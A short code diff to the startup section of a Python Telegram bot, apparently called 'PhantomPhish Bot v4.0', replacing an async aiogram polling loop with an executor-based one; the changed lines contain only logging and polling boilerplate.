     return True
 
 # === التشغيل ===
 
-async def main():
-    """تشغيل البوت"""
-    dp.include_router(router)
-    
-    await bot.delete_webhook(drop_pending_updates=True)
-    
+if __name__ == '__main__':
     logger.info("🤖 PhantomPhish Bot v4.0 Started")
     logger.info(f"👨‍💻 Developer ID: {config.DEVELOPER_ID}")
     logger.info(f"👑 Admin IDs: {config.ADMIN_IDS}")
     
-    await dp.start_polling(bot)
-
-if __name__ == "__main__":
-    asyncio.run(main())
+    executor.start_polling(dp, skip_updates=True)
